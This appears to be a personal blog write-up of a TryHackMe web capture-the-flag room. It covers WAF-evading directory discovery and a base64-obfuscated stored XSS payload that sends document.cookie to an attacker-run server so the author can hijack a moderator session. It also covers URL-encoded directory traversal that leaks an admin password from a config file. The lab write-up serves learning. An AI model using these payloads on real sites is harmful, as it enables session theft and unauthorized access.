---
created: 2026-01-17
tags:
  - note
  - journal
  - cyberStuff
title: padelify
draft: false
date:
subiect:
  - web
dificultate: 3
amuca: true
link:
  - https://tryhackme.com/room/padelify
lastmod: 2026-01-17T21:40:05.907Z
---
### reconing

First thinks first , its time to look for information

I tried running a gobuster scan with a common wordlists for discovery but nothing returned , surely a WAF( web aplication firewall )is blocking the acces\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117111458.png)

lets try to bypass it , using the flag `-a` bypass it pretty simple\
for noobies (like me ) the -a flag uses a diferent user agent than the default gobuster agent ,\
a user agent is a string of character that make the request to the site

![](/images/blog-ul-meu/static/Pasted%20image%2020260117112836.png)\
i gonna try another list this one is to short i think

![](/images/blog-ul-meu/static/Pasted%20image%2020260117113229.png)\
better this way , firefart is such a goated name\
lets try to accces config

![](/images/blog-ul-meu/static/Pasted%20image%2020260117113720.png)\
and the WAF is blocking it again cool

lets try to acces the log file\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117113943.png)\
ok cool it works\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117114001.png)\
and we have this cool error message here that explain us that xss (cross site scripting) attems may be possible , and also that the HttpOnly flag is not set

### how we gonna try to break it

A WAF can be passed a few ways , one of them is using a 64bit encoded string and the functions :\
`atiob()`- used to decode base 64  and `eval()` for executing the code resulted

so lets starts

first of all lets start a server to catch the flag with  `python3 -m http.server 80`

the we gonna go to the main sing up page and enter in the username place the followring:

```
<body` 
`onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjE0NS40LycrZG9jdW1lbnQuY29va2llKQ=='))">
```

the edcoded part is :

```
fetch('http://<YOUR IP>/'+document.cookie)
```

this will go straight to the app and be execute\
in the password field just enter something random

and bam bam bam we got something\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117121034.png)

now we just change our cookie with that string :\
'/PHPSESSID=pgulj9vf9eckvcpetht9ma6cmf'

now we just go and change the cookie (press F12 and go to the storage section than cookies)

![](/images/blog-ul-meu/static/Pasted%20image%2020260117124301.png)

and we have the first flag :\
**Flag:** THM{Logged\_1n\_Moderat0r}

### Second Flag

```
note : if u see a different ip is because i had to restart the challenege 
```

i click on Live button in the right upper corner of the previos panel and i got the following\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117162139.png)\
and if we look at the URL we may something interesting , the page=match.php , lets try to exploitat in a directory traversal way\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117162216.png)\
and the waf is blocking us again ,\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117162422.png)

lets maybe try to encode the character "/"

i encoded `/` with the character ..%2F which is URL encoding

![](/images/blog-ul-meu/static/Pasted%20image%2020260117162541.png)\
this is something interesting

lets try to read the config file with this vulnerability\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117163601.png)\
note: dont forget to encode '.' to  %2E or else will not work\
cool very cool we get it\
we may see some information in the app.conf about the admin info\
`admin_info = "bL}8,S9W1o44"`\
lets try to log in with this

and with the username ; admin and the password from above we succed to log in\
![](/images/blog-ul-meu/static/Pasted%20image%2020260117163937.png)\
**Flag:** THM{Logged\_1n\_Adm1n001}\
very cool chalange thank u THM
